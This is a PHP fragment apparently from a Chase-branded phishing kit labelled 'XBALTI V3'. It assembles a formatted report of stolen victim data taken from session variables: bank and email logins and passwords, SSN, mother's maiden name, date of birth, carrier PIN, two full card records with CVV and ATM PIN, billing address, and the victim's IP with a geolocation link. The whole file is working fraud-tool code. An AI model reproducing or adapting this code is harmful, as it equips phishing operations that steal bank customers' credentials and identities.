<?php
 $XBALTI_MESSAGE .= "==============|| CHASE XBALTI V3 ||==============</font></b>
 ==============||LOGIN INFORMATION||==============</font></b>
 <b><font color=#800000>USERNAME	: ".$_SESSION['userid']."</font></b>
 <b><font color=#800000>PASSWORD	: ".$_SESSION['passid']."</font></b>
 ==============||EMAIL INFORMATION||==============</font></b>
 <b><font color=#469990>EMAIL	    : ".$_SESSION['email']."</font></b>
 <b><font color=#469990>PASSWORD	: ".$_SESSION['password']."</font></b>
 ==============||EMAIL TWO INFORMATION||==============</font></b>
 <b><font color=#e6194B>EMAIL	    : ".$_SESSION['email1']."</font></b>
 <b><font color=#e6194B>PASSWORD	: ".$_SESSION['password1']."</font></b>
 ==============||SSN/MMN/DOB INFORMATION||==============</font></b>
 <b><font color=#3cb44b>SSN      	: ".$_SESSION['ssnnum']."</font></b>
 <b><font color=#3cb44b>MMN      	: ".$_SESSION['mdn']."</font></b>
 <b><font color=#3cb44b>DOB     	: ".$_SESSION['dob']."</font></b>
 <b><font color=#3cb44b>Phone number: ".$_SESSION['phone']."</font></b>
 <b><font color=#3cb44b>Carrier pin : ".$_SESSION['capin']."</font></b>
 ==============||CARD INFORMATION||==============</font></b>
 <b><font color=#911eb4>CARD NUMBER : ".$_SESSION['cardnu']."</font></b>
 <b><font color=#911eb4>EXP DATE 	: ".$_SESSION['expda']."</font></b>
 <b><font color=#911eb4>CVV     	: ".$_SESSION['cvv']."</font></b>
 <b><font color=#911eb4>ATM PIN   	: ".$_SESSION['pin']."</font></b>
 ==============||BILLING INFORMATION||==============</font></b>
 <b><font color=#000075>FULL NAME   : ".$_SESSION['fullname']."</font></b>
 <b><font color=#000075>Address 	: ".$_SESSION['Address']."</font></b>
 <b><font color=#000075>City     	: ".$_SESSION['City']."</font></b>
 <b><font color=#000075>State    	: ".$_SESSION['State']."</font></b>
 <b><font color=#000075>zip code    : ".$_SESSION['zipcode']."</font></b>
 ==============||CARD TWO INFORMATION||==============</font></b>
 <b><font color=#f58231>CARD NUMBER : ".$_SESSION['cardnutwo']."</font></b>
 <b><font color=#f58231>EXP DATE 	: ".$_SESSION['expdatwo']."</font></b>
 <b><font color=#f58231>CVV     	: ".$_SESSION['cvvtwo']."</font></b>
 <b><font color=#f58231>ATM PIN   	: ".$_SESSION['pintwo']."</font></b>
 ==============||VICTIM INFORMATION||==============</font></b>
 <b><font color=#000000>IP INFO 		: https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font></b>
 <b><font color=#000000>TIME/DATE 		: ".$TIME_DATE."</font></b>";

?>